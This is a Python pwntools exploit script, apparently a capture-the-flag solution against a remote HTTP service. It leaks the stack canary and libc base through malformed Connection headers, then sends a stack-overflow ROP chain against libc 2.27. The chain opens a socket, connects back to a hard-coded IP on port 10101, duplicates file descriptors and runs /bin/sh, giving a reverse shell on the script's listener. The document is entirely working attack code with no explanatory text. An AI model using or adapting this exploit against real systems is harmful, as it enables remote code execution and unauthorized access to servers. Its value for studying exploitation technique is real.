from pwn import *

###Util
def request(payload):
    r.send(payload)
    r.recvuntil('Connection: ')
    return r.recvuntil('\r\n',drop=True)

###Addr
#  libc2.27
clone_ret_ptr_offset = 0x12188f
libc_writable_offset = 0x3eb000
bin_sh_offset = 0x1b3e9a

###ROPgadget
L_pop_rax = 0x439c8
L_pop_rdi = 0x2155f
L_pop_rsi = 0x23e6a
L_pop_rdx = 0x1b96
L_syscall = 0xd2975
L_mov_rdival_rsi = 0x54a5a  #mov qword ptr [rdi], rsi ; ret

###Exploit
r = remote('nc.eonew.cn',10013)
l = listen(10101)

leaks = request('GET / HTTP/1,1\r\nConnection: \n\n\nkeep-alive'.ljust(0x409,'a'))
canary = u64(b'\x00'+leaks[0x3ed:])
print(hex(canary))
leaks = request('GET / HTTP/1,1\r\nConnection: \n\n\nkeep-alive'.ljust(0x4e8,'a'))
clone_ret_ptr_addr = u64(leaks[0x4cc:]+b'\x00\x00')
libc_base = clone_ret_ptr_addr-clone_ret_ptr_offset
print(hex(libc_base))

prefix = b'GET / HTTP/1,1\r\nConnection: \n\n\nclose'.ljust(0x408,b'\x00')
canary = p64(canary)
padding = b'\x00'*0x18
ROPchain = p64(libc_base+L_pop_rdi)+p64(2)+\
           p64(libc_base+L_pop_rsi)+p64(1)+\
           p64(libc_base+L_pop_rdx)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(41)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(libc_base+libc_writable_offset)+\
           p64(libc_base+L_pop_rsi)+p16(2)+p16(10101,endian='big')+p32(0x221e708c)+\
           p64(libc_base+L_mov_rdival_rsi)+\
           p64(libc_base+L_pop_rdi)+p64(libc_base+libc_writable_offset+0x8)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_mov_rdival_rsi)+\
           p64(libc_base+L_pop_rdi)+p64(3)+\
           p64(libc_base+L_pop_rsi)+p64(libc_base+libc_writable_offset)+\
           p64(libc_base+L_pop_rdx)+p64(0x10)+\
           p64(libc_base+L_pop_rax)+p64(42)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(3)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(33)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(3)+\
           p64(libc_base+L_pop_rsi)+p64(1)+\
           p64(libc_base+L_pop_rax)+p64(33)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rdx)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(59)+\
           p64(libc_base+L_syscall)
payload = prefix+canary+padding+ROPchain
print(hex(len(payload)))

leaks = request(payload)

l.wait_for_connection()
l.interactive()
'''
'''
